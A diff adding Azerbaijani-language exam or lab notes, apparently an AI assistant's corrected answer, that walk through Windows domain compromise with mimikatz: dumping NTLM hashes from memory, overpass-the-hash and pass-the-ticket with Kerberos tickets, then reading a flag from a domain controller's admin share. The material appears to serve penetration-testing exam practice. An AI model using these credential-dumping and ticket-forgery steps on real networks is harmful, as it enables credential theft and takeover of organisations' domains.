@@ -165,3 +165,83 @@ john --show hashes.txt
 ### Alternativ Olaraq: Şifrəni Onlayn Sındırmaq (Əgər internet varsa)
 
 Əgər imtahan mühitindən xarici internetə çıxışınız varsa və ya hash-i öz kompüterinizə köçürə bilirsinizsə, **CrackStation** kimi onlayn bazalardan istifadə edə bilərsiniz. Lakin yadda saxlayın ki, onlayn xidmətlər adətən sadə NTLM və ya MD5 hash-lərini yaxşı tapır, Kerberos biletlərinin strukturunu hər sayt dəstəkləməyə bilər. Buna görə imtahanda ən etibarlı yol lokal olaraq `john` və ya `hashcat` işlətməkdir.
+
+
+
+
+
+Düzgün qeyd etdiniz, üzrlü sayın. Mən yuxarıda həm `mimikatz` daxilindəki əmrləri, həm də onun açdığı standart Windows terminalındakı əmrləri qarışıq yazdım və bu çaşqınlıq yaratdı. Gəlin imtahanda birbaşa **`mimikatz` terminalının öz içində** edəcəyiniz addımları tam dəqiq və ardıcıl yazaq.
+
+Əgər siz maşında `GodPotato` ilə artıq administrator (SYSTEM) olmusunuzsa, `mimikatz`-ı işlədirsiniz. Qarşınızda `mimikatz #` sətri açılır. Proses tam olaraq bu 3 addımdan ibarətdir:
+
+### 1. Sistem Yaddaşından Hash-ləri Çıxarmaq
+
+`mimikatz #` sətrində ardıcıl olaraq bu iki əmri yazırsınız:
+
+```cmd
+privilege::debug
+sekurlsa::logonpasswords
+
+```
+
+Bu əmrlərin nəticəsində ekranda böyük bir siyahı çıxacaq. Orada `Domain Admin` (məsələn, Administrator) istifadəçisini tapıb onun qarşısındakı **NTLM hash-ini** köpylayırsınız.
+
+### 2. Mimikatz ilə Bilet Yaradıb Yeni Terminal Açmaq (Overpass-the-Hash)
+
+İndi isə əlimizdəki o NTLM hash ilə Kerberos bileti (Ticket) yaratmaq üçün **yenə `mimikatz #` sətrində** bu əmri icra edirik:
+
+```cmd
+sekurlsa::pth /user:Administrator /domain:domen.local /ntlm:TAPILAN_NTLM_HASHI /run:cmd.exe
+
+```
+
+* **Bu əmr nə edir?** `mimikatz` həmin NTLM hash-i istifadə edərək arxa fonda Kerberos xidmətindən qanuni bir bilet (TGT) tələb edir və həmin biletin aktiv olduğu yeni bir Windows terminalı (`cmd.exe`) açır.
+
+### 3. Açılan Yeni Terminalda Flag-ı Oxumaq
+
+Ekranda avtomatik olaraq **yeni bir qara terminal** açılacaq. **Bax bu terminalın içində** siz artıq şəbəkədə `Domain Admin` hüququna sahibsiniz.
+
+Həmin yeni açılan terminalda Domen Controller serverinin (`C$` paylaşımına) daxil olub flag-ı birbaşa oxuyursunuz:
+
+```cmd
+type \\DomenController_IP_ve_ya_Adi\C$\Users\Administrator\Desktop\root.txt
+
+```
+
+---
+
+### Alternativ Variant: Biletləri Birbaşa Mimikatz ilə "Inject" Etmək (Pass-the-Ticket)
+
+Əgər hash ilə deyil, yaddaşda olan hazır `.kirbi` bilet faylları ilə etmək istəyirsinizsə, tam olaraq `mimikatz`-ın içində edilən ardıcıllıq belədir:
+
+1. **Yaddaşdakı biletləri diskə çıxarmaq (`mimikatz` içində):**
+```cmd
+privilege::debug
+standard::elevation
+kerberos::list /export
+
+```
+
+
+*Bu, olduğunuz qovluğa çoxlu `.kirbi` faylları atacaq. Oradan Domain Admin-ə aid olan faylın adını kopyalayırsınız.*
+2. **Bileti cari sessiyaya yükləmək (`mimikatz` içində):**
+```cmd
+kerberos::ptt "bilet_faylinin_tam_adi.kirbi"
+
+```
+
+
+*Bu əmri yazdıqdan sonra `mimikatz` sizə `OK` mesajı verəcək.*
+3. **İndi isə mimikatz-dan çıxmadan birbaşa onun içindən əmr göndərmək:**
+Bilet artıq `mimikatz`-ın olduğu sessiyaya yükləndiyi üçün, elə mimikatz-ın içində `misc::cmd` yazaraq və ya birbaşa flag-ı oxumaq olar:
+```cmd
+misc::cmd
+
+```
+
+
+Açılan terminalda yenə:
+```cmd
+type \\DomenController_IP\C$\Users\Administrator\Desktop\root.txt
+
+```
